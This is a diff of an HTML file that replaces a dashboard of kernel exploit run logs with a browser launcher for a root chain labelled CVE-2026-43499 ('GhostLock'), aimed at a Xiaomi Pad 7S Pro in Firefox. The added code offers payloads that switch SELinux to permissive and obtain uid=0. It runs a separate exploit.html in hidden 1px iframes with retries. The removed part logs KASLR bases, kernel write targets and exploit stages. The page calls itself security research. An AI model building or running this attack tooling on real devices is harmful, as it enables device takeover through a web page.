@@ -1,253 +1,238 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
+<!doctype html>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IonStack Violin — Run Viewer</title>
-<style>
-:root{--bg:#0d1117;--fg:#c9d1d9;--card:#161b22;--border:#21262d;--accent:#58a6ff;--red:#f85149;--green:#3fb950;--yellow:#d29922;--orange:#db6d28;--purple:#bc8cff}
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,Segoe UI,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--fg);line-height:1.6}
-.wrap{max-width:1100px;margin:0 auto;padding:1.5rem}
-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;flex-wrap:wrap;gap:1rem}
-header h1{font-size:1.6rem}
-header h1 .r{color:var(--red)}
-nav{display:flex;gap:.5rem;flex-wrap:wrap}
-nav a{color:var(--fg);text-decoration:none;background:var(--card);border:1px solid var(--border);padding:.4rem .8rem;border-radius:6px;font-size:.85rem;transition:border-color .2s}
-nav a:hover,nav a.active{border-color:var(--accent);color:var(--accent)}
-.bar{display:flex;gap:1rem;margin-bottom:1.5rem;flex-wrap:wrap;align-items:center}
-.bar select,.bar input{background:var(--card);color:var(--fg);border:1px solid var(--border);padding:.4rem .6rem;border-radius:6px;font-size:.85rem}
-.bar label{font-size:.85rem;color:#8b949e}
-.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1.2rem;margin-bottom:1rem}
-.card h2{font-size:1.1rem;margin-bottom:.8rem;color:#e6edf3}
-table{width:100%;border-collapse:collapse;font-size:.85rem}
-th,td{text-align:left;padding:.5rem .6rem;border-bottom:1px solid var(--border)}
-th{color:#8b949e;font-weight:600;font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
-.badge{display:inline-block;padding:.15em .5em;border-radius:4px;font-size:.75rem;font-weight:600}
-.b-red{background:rgba(248,81,73,.15);color:var(--red);border:1px solid rgba(248,81,73,.3)}
-.b-green{background:rgba(63,185,80,.15);color:var(--green);border:1px solid rgba(63,185,80,.3)}
-.b-yellow{background:rgba(210,153,34,.15);color:var(--yellow);border:1px solid rgba(210,153,34,.3)}
-.b-blue{background:rgba(88,166,255,.15);color:var(--accent);border:1px solid rgba(88,166,255,.3)}
-.b-purple{background:rgba(188,140,255,.15);color:var(--purple);border:1px solid rgba(188,140,255,.3)}
-.chain{display:flex;gap:.4rem;align-items:center;flex-wrap:wrap;margin:.8rem 0}
-.chain .s{background:#21262d;border:1px solid var(--border);border-radius:6px;padding:.4rem .7rem;font-size:.8rem;text-align:center;min-width:80px}
-.chain .s.ok{border-color:var(--green);color:var(--green)}
-.chain .s.pending{border-color:var(--yellow);color:var(--yellow)}
-.chain .s.fail{border-color:var(--red);color:var(--red)}
-.chain .arr{color:var(--accent);font-size:1rem}
-.log{background:#0d1117;border:1px solid var(--border);border-radius:6px;padding:.8rem;font-family:SF Mono,Fira Code,Consolas,monospace;font-size:.8rem;line-height:1.5;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
-.log .hl-green{color:var(--green)}.log .hl-red{color:var(--red)}.log .hl-yellow{color:var(--yellow)}.log .hl-blue{color:var(--accent)}
-.dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:.3rem;vertical-align:middle}
-.dot-g{background:var(--green)}.dot-r{background:var(--red)}.dot-y{background:var(--yellow)}
-.empty{color:#484f58;text-align:center;padding:3rem;font-size:1.1rem}
-footer{margin-top:2rem;padding-top:1rem;border-top:1px solid var(--border);color:#484f58;font-size:.8rem;text-align:center}
-@media(max-width:600px){.wrap{padding:1rem}.chain{flex-direction:column}.chain .arr{transform:rotate(90deg)}}
-</style>
-</head>
-<body>
-<div class="wrap">
-<header>
-  <h1><span class="r">IonStack</span> Violin</h1>
-  <nav id="nav"></nav>
-</header>
-<div class="bar">
-  <label>Payload:</label>
-  <select id="sel-payload"></select>
-  <label>Run:</label>
-  <select id="sel-run"></select>
-</div>
-<div id="content"></div>
-<footer>IonStack Violin · CVE-2026-43499 · Security Research</footer>
-</div>
+<title>IonStack Violin</title>
 <script>
-const DATA = {
-  runs: {
-    "violin-r3-20260722-01": {
-      payload: "r3", date: "2026-07-22", device: "violin",
-      build: { variant: "violin-v-oss", artifact: "r3.so", size: 86664, sha256: "—" },
-      kaslr: { method: "env:CFI_KASLR_BASE", base: "0xffffffd5eda00000", slide: "0x15e5a00000", ok: true },
-      evidence: {
-        "ROUTE_REACHED": true,
-        "CFI_ROUTE_OK": false,
-        "DIRECT_WRITE_ROUTE_OK": false,
-        "CRED_READBACK": false,
-        "TARGET_SLOT_READBACK": false
-      },
-      steps: [
-        { name: "KASLR", status: "ok", detail: "env:CFI_KASLR_BASE=0xffffffd5eda00000" },
-        { name: "Requeue", status: "ok", detail: "ret=1 errno=0" },
-        { name: "PI Chain", status: "ok", detail: "consumer calls=105 success=105" },
-        { name: "Direct Write", status: "pending", detail: "待验证 pselect fd_set 路径" },
-        { name: "Fops Hijack", status: "pending", detail: "依赖 direct write" },
-        { name: "ConfigFS R/W", status: "ok", detail: "read_iter/write_iter 已验证" },
-        { name: "Pipe PhysRW", status: "ok", detail: "pipe_buffer 重叠" },
-        { name: "Root", status: "pending", detail: "依赖 fops hijack" },
-        { name: "KernelSU", status: "pending", detail: "late-load 框架就绪" }
-      ],
-      log: `STEP0: preload loaded pid=15820
-CFGPROBE_START
-CFGPROBE_PREHIJACK_NOTE: ashmem fd still uses ashmem_read_iter until fops hijack; rd=0/EOF is expected when asma->size is 0
-CFGPROBE_MISS
-CFGPROBE_STOP_AFTER_PROBE: ok=0 kaslr_done=0
-STEP1_EXTERNAL_KASLR: base=0xffffffd5eda00000 slide=0x15e5a00000 source=env:CFI_KASLR_BASE
-STEP1: slide OK kaslr_base=0xffffffd5eda00000 slide=0x15e5a00000
-STEP2: prepare_page page=0xffffff81e7998000 lock=0xffffff81e79984d0 fops=0xffffff81e7998180
-STEP3: entering run_main_route_threads
-ROUTE_PREP_REQUEUE: ret=1 errno=0
-WAITER_FOPS_ROUTE_ENTER: tid=22371
-FOPSROUTE_GO: attempt=1 delay=50000 waiter_tid=22371
-FOPSROUTE_RET: attempt=1 ret=0 errno=0 calls=105 success=105 delay=50000
-FOPSROUTE_CFI_DISPATCH: attempt=1
-FOPSROUTE_CFI_RESULT: attempt=1 ok=0 step=1 errno=22
-EVIDENCE: ROUTE_REACHED=1
-EVIDENCE: CFI_ROUTE_OK=0
-EVIDENCE: DIRECT_WRITE_ROUTE_OK=0
-EVIDENCE: CRED_READBACK=0
-EVIDENCE: TARGET_SLOT_READBACK=0
-EVIDENCE: TARGET_WRITE=UNKNOWN_NO_TARGET_READBACK
-boot_id after: ee24a224-a8a5-4c79-825b-638bded450e6`
-    },
-    "violin-r4-20260722-01": {
-      payload: "r4", date: "2026-07-22", device: "violin",
-      build: { variant: "violin-v-oss", artifact: "r4.so", size: 86464, sha256: "—" },
-      kaslr: { method: "env:CFI_KASLR_BASE", base: "0xffffffd5eda00000", slide: "0x15e5a00000", ok: true },
-      evidence: {
-        "ROUTE_REACHED": true,
-        "CFI_ROUTE_OK": false,
-        "DIRECT_WRITE_ROUTE_OK": false
-      },
-      steps: [
-        { name: "KASLR", status: "ok", detail: "env:CFI_KASLR_BASE" },
-        { name: "Requeue", status: "ok", detail: "ret=1 errno=0" },
-        { name: "PI Chain", status: "ok", detail: "consumer calls=105 success=105" },
-        { name: "Direct Write", status: "pending", detail: "pselect fd_set 路径切换中" },
-        { name: "Fops Hijack", status: "pending", detail: "rb_insert 不可用，需 direct write" },
-        { name: "Root", status: "pending", detail: "—" }
-      ],
-      log: `STEP2B: set_pselect_write target=0xffffff800223b5e8 value=0xffffff81e7998180
-STEP3: entering run_main_route_threads
-ROUTE_PREP_REQUEUE: ret=1 errno=0
-FOPSROUTE_GO: attempt=1 delay=50000
-FOPSROUTE_RET: attempt=1 ret=0 errno=0 calls=105 success=105
-FOPSROUTE_CFI_RESULT: attempt=1 ok=0 step=1 errno=22
-[direct write 路径待设备验证]`
-    }
-  },
-  navItems: [
-    { label: "Dashboard", page: "dashboard" },
-    { label: "Chain", page: "chain" },
-    { label: "Log", page: "log" }
-  ]
+const MAX_ATTEMPTS = 3;
+const ATTEMPT_TIMEOUT_MS = 8000;
+const RUN_ID = Date.now().toString(36) + Math.random().toString(36).slice(2);
+const queryParams = new URLSearchParams(location.search);
+const PRIVATE_DIR = "/data/data/org.mozilla.firefox/files";
+
+const BANNER = [
+  "",
+  "  ╦╔═╔═╗╔╦╗╔═╗╦═╗╔╦╗",
+  "  ║║ ║╣  ║ ║╣ ╠╦╝║║║",
+  "  ╩╚═╚═╝ ╩ ╚═╝╩╚═╩ ╩",
+  "  GhostLock CVE-2026-43499",
+  "  Xiaomi Pad 7S Pro (violin)",
+  "",
+].join("\n");
+
+let done = false;
+let attempt = 0;
+let timer = 0;
+let confirmed = false;
+let selectedPayload = "";
+const frames = [];
+let logElement = null;
+let statusElement = null;
+
+const PAYLOADS = {
+  "r3": { name: "r3.so — permissive + root", file: "r3.so", desc: "SELinux permissive + uid=0" },
+  "r4": { name: "r4.so — direct write", file: "r4.so", desc: "Direct pselect write path" },
+  "p":  { name: "p.so — permissive only", file: "p.so", desc: "SELinux permissive (no root)" },
+  "r2": { name: "r2.so — root v2", file: "r2.so", desc: "Root with cred replace" },
 };
 
-let currentPage = "dashboard";
-let currentRun = null;
-
-function getParam(k){return new URLSearchParams(location.search).get(k)}
-function setParam(k,v){const u=new URL(location);u.searchParams.set(k,v);history.replaceState(null,'',u)}
-
-function init(){
-  const selP = document.getElementById('sel-payload');
-  const selR = document.getElementById('sel-run');
-  const payloads = [...new Set(Object.values(DATA.runs).map(r=>r.payload))];
-  payloads.forEach(p=>{const o=document.createElement('option');o.value=p;o.textContent=p;selP.appendChild(o)});
-  const runParam = getParam('run');
-  const payloadParam = getParam('payload');
-  if(payloadParam) selP.value = payloadParam;
-  selP.onchange = ()=>{updateRuns();setParam('payload',selP.value)};
-  updateRuns();
-  if(runParam && DATA.runs[runParam]){selR.value=runParam}
-  selR.onchange = ()=>{currentRun=selR.value;setParam('run',currentRun);render()};
-  currentRun = selR.value;
-  renderNav();
-  render();
+function childUrl(n) {
+  const dir = location.pathname.replace(/[^/]*$/, "");
+  return dir + "exploit.html?run=" + encodeURIComponent(RUN_ID) +
+    "&attempt=" + n + "&payload=" + encodeURIComponent(selectedPayload);
 }
 
-function updateRuns(){
-  const selP = document.getElementById('sel-payload');
-  const selR = document.getElementById('sel-run');
-  const p = selP.value;
-  selR.innerHTML='';
-  Object.entries(DATA.runs).filter(([k,v])=>v.payload===p).forEach(([k,v])=>{
-    const o=document.createElement('option');o.value=k;o.textContent=k;selR.appendChild(o);
-  });
-  currentRun = selR.value;
+function log(msg) {
+  if (logElement) {
+    logElement.textContent += msg + "\n";
+    logElement.scrollTop = logElement.scrollHeight;
+  }
+  try { console.log(msg); } catch(e) {}
 }
 
-function renderNav(){
-  const nav = document.getElementById('nav');
-  nav.innerHTML='';
-  DATA.navItems.forEach(n=>{
-    const a=document.createElement('a');a.href='#';a.textContent=n.label;
-    if(n.page===currentPage) a.className='active';
-    a.onclick=(e)=>{e.preventDefault();currentPage=n.page;renderNav();render()};
-    nav.appendChild(a);
-  });
+function setStatus(msg) {
+  if (statusElement) statusElement.textContent = msg;
+  document.title = msg;
 }
 
-function render(){
-  const c = document.getElementById('content');
-  const run = DATA.runs[currentRun];
-  if(!run){c.innerHTML='<div class="empty">选择一个 run 查看详情</div>';return}
-  if(currentPage==='dashboard') renderDashboard(c,run);
-  else if(currentPage==='chain') renderChain(c,run);
-  else if(currentPage==='log') renderLog(c,run);
+function cleanupFrames() {
+  for (const f of frames) { try { f.remove(); } catch(e) {} }
+  frames.length = 0;
 }
 
-function renderDashboard(c,run){
-  const ev = run.evidence||{};
-  const evRows = Object.entries(ev).map(([k,v])=>
-    `<tr><td>${k}</td><td><span class="dot ${v?'dot-g':'dot-r'}"></span>${v?'PASS':'FAIL'}</td></tr>`
-  ).join('');
-  const stepRows = (run.steps||[]).map(s=>{
-    const cls = s.status==='ok'?'b-green':s.status==='fail'?'b-red':'b-yellow';
-    return `<tr><td>${s.name}</td><td><span class="badge ${cls}">${s.status.toUpperCase()}</span></td><td>${s.detail}</td></tr>`;
-  }).join('');
-  c.innerHTML=`
-  <div class="card"><h2>📋 Run: ${currentRun}</h2>
-    <table>
-      <tr><th>Field</th><th>Value</th></tr>
-      <tr><td>Payload</td><td><span class="badge b-blue">${run.payload}</span></td></tr>
-      <tr><td>Date</td><td>${run.date}</td></tr>
-      <tr><td>Device</td><td>${run.device}</td></tr>
-      <tr><td>Build</td><td>${run.build.variant} / ${run.build.artifact} (${run.build.size} bytes)</td></tr>
-      <tr><td>KASLR</td><td>${run.kaslr.ok?'<span class="dot dot-g"></span>':'<span class="dot dot-r"></span>'}${run.kaslr.method} base=${run.kaslr.base} slide=${run.kaslr.slide}</td></tr>
-    </table>
-  </div>
-  <div class="card"><h2>📊 Evidence</h2><table><tr><th>Marker</th><th>Status</th></tr>${evRows}</table></div>
-  <div class="card"><h2>⛓️ Steps</h2><table><tr><th>Stage</th><th>Status</th><th>Detail</th></tr>${stepRows}</table></div>`;
+function releasePage() {
+  if (done) return;
+  done = true;
+  clearTimeout(timer);
+  cleanupFrames();
 }
 
-function renderChain(c,run){
-  const steps = run.steps||[];
-  const chain = steps.map((s,i)=>{
-    const cls = s.status==='ok'?'ok':s.status==='fail'?'fail':'pending';
-    const arrow = i<steps.length-1?'<span class="arr">→</span>':'';
-    return `<div class="s ${cls}">${s.name}<br><small>${s.status}</small></div>${arrow}`;
-  }).join('');
-  c.innerHTML=`
-  <div class="card"><h2>⛓️ Exploit Chain — ${currentRun}</h2>
-    <div class="chain">${chain}</div>
-    <table style="margin-top:1rem"><tr><th>Stage</th><th>Status</th><th>Detail</th></tr>
-      ${steps.map(s=>`<tr><td>${s.name}</td><td>${s.status.toUpperCase()}</td><td>${s.detail}</td></tr>`).join('')}
-    </table>
-  </div>`;
+function showResult(lines, finalMessage) {
+  cleanupFrames();
+  const resultEl = document.getElementById("result");
+  if (resultEl) {
+    resultEl.style.display = "block";
+    resultEl.textContent = (lines || []).join("\n") + (finalMessage ? "\n" + finalMessage : "");
+  }
+  setStatus("Done");
+  log("[+] Exploit completed");
+  try { navigator.vibrate && navigator.vibrate([200, 100, 200]); } catch(e) {}
 }
 
-function renderLog(c,run){
-  const log = run.log||'(no log)';
-  const colored = log.split('\n').map(line=>{
-    if(/PASS|OK|SUCCESS|ok=1|success=1/.test(line)) return `<span class="hl-green">${esc(line)}</span>`;
-    if(/FAIL|ERROR|MISS|ok=0|errno/.test(line)) return `<span class="hl-red">${esc(line)}</span>`;
-    if(/STEP|ROUTE|FOPSROUTE/.test(line)) return `<span class="hl-blue">${esc(line)}</span>`;
-    if(/WARN|pending/.test(line)) return `<span class="hl-yellow">${esc(line)}</span>`;
-    return esc(line);
-  }).join('\n');
-  c.innerHTML=`<div class="card"><h2>📜 Log — ${currentRun}</h2><div class="log">${colored}</div></div>`;
+function startAttempt() {
+  if (done || confirmed || attempt >= MAX_ATTEMPTS) return;
+  attempt++;
+  setStatus("Attempt " + attempt + "/" + MAX_ATTEMPTS + " — launching...");
+  log("[*] Attempt " + attempt + ": loading exploit iframe");
+
+  const frame = document.createElement("iframe");
+  frame.style.cssText = "position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01;pointer-events:none;border:0";
+  frame.src = childUrl(attempt);
+  frames.push(frame);
+  document.body.appendChild(frame);
+
+  timer = setTimeout(() => {
+    if (!done) {
+      log("[-] Attempt " + attempt + " timed out");
+      try { frame.remove(); } catch(e) {}
+      if (attempt < MAX_ATTEMPTS) {
+        startAttempt();
+      } else {
+        setStatus("All attempts failed");
+        log("[!] Max attempts reached. Try refreshing.");
+      }
+    }
+  }, ATTEMPT_TIMEOUT_MS);
 }
 
-function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
-init();
+addEventListener("message", (event) => {
+  const data = event.data;
+  if (!data || data.run !== RUN_ID || done) return;
+
+  if (data.type === "device") {
+    clearTimeout(timer);
+    const deviceId = String(data.deviceId || "").trim();
+    const isSupported = data.isSupported === true;
+    const msg = "Device: " + deviceId + "\n" +
+      (isSupported ? "✓ Device supported. May reboot. Continue?" :
+                     "⚠ Device NOT supported. Will likely reboot. Continue?");
+    const ok = confirm(msg);
+    if (!ok) { done = true; cleanupFrames(); setStatus("Cancelled"); return; }
+    const final = confirm("Save your work. OK to proceed, Cancel to stop.");
+    if (!final) { done = true; cleanupFrames(); setStatus("Cancelled"); return; }
+    confirmed = true;
+    try { event.source.postMessage({ type: "decision", run: RUN_ID, attempt: data.attempt, ok: true }, "*"); }
+    catch(e) { done = true; cleanupFrames(); }
+    return;
+  }
+
+  if (data.type === "stop") {
+    done = true; clearTimeout(timer); cleanupFrames();
+    setStatus("Stopped by exploit");
+    return;
+  }
+  if (data.type === "fail") {
+    clearTimeout(timer);
+    if (confirmed) { done = true; cleanupFrames(); setStatus("Failed after confirmation"); return; }
+    for (let i = 0; i < frames.length; i++) {
+      try { if (frames[i].contentWindow === event.source) { frames[i].remove(); frames.splice(i, 1); break; } } catch(e) {}
+    }
+    log("[-] Attempt failed, retrying...");
+    startAttempt();
+    return;
+  }
+  if (data.type === "progress") {
+    clearTimeout(timer);
+    const lines = Array.isArray(data.lines) ? data.lines : [];
+    for (const line of lines) log("  " + line);
+    if (data.finalMessage) log(data.finalMessage);
+    setStatus("Running...");
+    return;
+  }
+  if (data.type === "success") {
+    showResult(data.lines, data.finalMessage);
+  }
+});
+
+addEventListener("pagehide", releasePage);
+
+function buildUI() {
+  const style = document.createElement("style");
+  style.textContent = [
+    "*{box-sizing:border-box;margin:0;padding:0}",
+    "body{background:#080b0f;font-family:'Courier New',monospace;color:#c9d1d9}",
+    "#wrap{display:flex;flex-direction:column;align-items:center;min-height:100svh;padding:clamp(16px,5vw,32px);gap:16px}",
+    "#banner{color:#f85149;font-size:clamp(11px,2.8vw,14px);white-space:pre;text-align:center;text-shadow:0 0 10px rgba(248,81,73,0.5)}",
+    "#divider{width:min(360px,90vw);border:none;border-top:1px solid #2a1a1a}",
+    "#label{color:#554;font-size:clamp(10px,2.5vw,12px);letter-spacing:2px;text-transform:uppercase}",
+    "#btns{display:flex;flex-direction:column;gap:10px;width:min(400px,92vw)}",
+    ".btn{display:flex;flex-direction:column;gap:4px;padding:clamp(12px,3vw,16px) clamp(14px,4vw,20px);background:rgba(248,81,73,0.03);border:1px solid #3a1e1e;border-radius:8px;color:#f85149;font-family:inherit;cursor:pointer;text-align:left;transition:all .15s;-webkit-tap-highlight-color:transparent;touch-action:manipulation}",
+    ".btn:hover{background:rgba(248,81,73,0.09);border-color:#f85149;box-shadow:0 0 16px rgba(248,81,73,0.2)}",
+    ".btn:active{transform:scale(0.98)}",
+    ".btn-tag{font-size:clamp(10px,2.5vw,11px);color:#554;letter-spacing:1px}",
+    ".btn-name{font-size:clamp(12px,3.5vw,15px);color:#f85149}",
+    ".btn-desc{font-size:clamp(10px,2.5vw,11px);color:#665}",
+    "#status{color:#58a6ff;font-size:clamp(11px,2.8vw,13px);text-align:center;min-height:1.5em}",
+    "#log{color:#8b949e;font-size:clamp(10px,2.5vw,12px);white-space:pre-wrap;max-height:40vh;overflow-y:auto;width:min(420px,92vw);padding:8px;background:#0d1117;border:1px solid #21262d;border-radius:6px;display:none}",
+    "#result{color:#3fb950;font-size:clamp(11px,2.8vw,13px);white-space:pre-wrap;width:min(420px,92vw);padding:12px;background:#0d1117;border:1px solid #238636;border-radius:6px;display:none}",
+    "#note{color:#443;font-size:clamp(10px,2.5vw,11px);text-align:center;max-width:min(360px,88vw);line-height:1.6}",
+  ].join("\n");
+  document.head.appendChild(style);
+
+  const wrap = document.createElement("div");
+  wrap.id = "wrap";
+  document.body.appendChild(wrap);
+
+  const banner = document.createElement("pre");
+  banner.id = "banner";
+  banner.textContent = BANNER;
+  wrap.appendChild(banner);
+
+  wrap.appendChild(Object.assign(document.createElement("hr"), { id: "divider" }));
+
+  const label = document.createElement("div");
+  label.id = "label";
+  label.textContent = "// Select Payload";
+  wrap.appendChild(label);
+
+  const btns = document.createElement("div");
+  btns.id = "btns";
+  wrap.appendChild(btns);
+
+  for (const [key, info] of Object.entries(PAYLOADS)) {
+    const btn = document.createElement("button");
+    btn.className = "btn";
+    btn.innerHTML = '<span class="btn-tag">PAYLOAD</span><span class="btn-name">' + info.name + '</span><span class="btn-desc">' + info.desc + '</span>';
+    btn.addEventListener("click", () => {
+      selectedPayload = key;
+      btns.style.display = "none";
+      label.style.display = "none";
+      logEl.style.display = "block";
+      navigator.wakeLock && navigator.wakeLock.request("screen").catch(() => {});
+      startAttempt();
+    });
+    btns.appendChild(btn);
+  }
+
+  const status = document.createElement("div");
+  status.id = "status";
+  status.textContent = "Select a payload to begin";
+  wrap.appendChild(status);
+  statusElement = status;
+
+  const logEl = document.createElement("div");
+  logEl.id = "log";
+  wrap.appendChild(logEl);
+  logElement = logEl;
+
+  const result = document.createElement("div");
+  result.id = "result";
+  wrap.appendChild(result);
+
+  const note = document.createElement("div");
+  note.id = "note";
+  note.textContent = "Xiaomi Pad 7S Pro (violin) · Android 16 · Kernel 6.6.77 · Firefox · 仅供安全研究";
+  wrap.appendChild(note);
+}
+
+buildUI();
 </script>
-</body>
-</html>
